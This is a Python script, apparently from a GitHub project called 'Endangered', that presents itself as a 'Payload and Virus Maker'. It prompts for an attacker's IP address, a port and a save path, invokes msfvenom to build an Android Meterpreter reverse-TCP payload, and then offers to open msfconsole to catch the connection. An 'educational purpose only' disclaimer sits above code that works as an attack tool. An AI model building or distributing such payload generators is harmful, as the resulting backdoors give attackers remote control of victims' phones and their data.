import os
import time
import subprocess

class Colours:
    white = "\033[1;37m"
    grey = "\033[0;37m"
    purple = "\033[0;35m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    Purple = "\033[0;35m"
    Cyan = "\033[0;36m"
    Cafe = "\033[0;33m"
    Fiuscha = "\033[0;35m"
    blue = "\033[1;34m"
    transparent = "\e[0m"

os.system("clear")
try:
    file = open("Banner4.txt", "r")
    if file.mode == "r" :
        content = file.read()
        print(Colours.red + content + Colours.green)
except IOError:
    print("Banner File not Found")
print("                                                                                  --------"+Colours.green+"["+Colours.yellow+"Payload and Virus Maker for windows And Android"+Colours.green+"]")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Author      :   M4f1aClow3n")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Instagram   :   https://instagram.com/its_me_abhishek002")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Github      :   https://github.com/M4f1aClow3n/Endangered")
print(Colours.red + "_________________________________________________________________________________________________________________________")
print(Colours.green + "Important Note :-" )
print(Colours.Cyan + "                   THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSE,FOR ANY ILLEGAL ACTIVITY I M NOT RESPONSIBLE" + Colours.green)
print("")
print(Colours.red + "[" + Colours.green + "1" + Colours.red+"]"+Colours.yellow+"Reverse_TCP Payload")
print("")
try:
    selector = int(input(Colours.red + "[" + Colours.green +"Select "+Colours.Cyan+"a " +Colours.yellow+ "Number"+Colours.red+"]=====>> "+Colours.green))

    lhost_ip = input(Colours.red + "["+Colours.green+"Enter Your Ip address"+Colours.red+"]====>> "+Colours.green)
    lport = input(Colours.red + "["+Colours.green+"Enter a local port number, suggested 4444"+Colours.red+"]====>> "+Colours.green)
    path = input(Colours.red + "["+Colours.green+"enter the path to save the payload"+Colours.red+"]====>> " +Colours.green)

    if selector == 1:
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Please Wait")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "    Initializing")
        subprocess.call(["msfvenom","-p", "android/meterpreter/reverse_tcp","lhost="+lhost_ip,"lport="+lport, "-o",path])
        fake = "."
        while fake <= ".....":
            fake = fake + "."
            print("\r" + Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Please Wait" + str(fake), end="")
            time.sleep(0.5)
        time.sleep(3)
        ask1 = str(input("\nDo you want to open MsfConsole (y/n)"))
        if ask1 == "y":
            os.system("clear")
            os.system("msfconsole")
        if ask1 == "n":
            os.system("python3 Android.py")
except KeyboardInterrupt:
    print(Colours.yellow + "\nCool Attitude Man!!"+Colours.green+"\nBye")
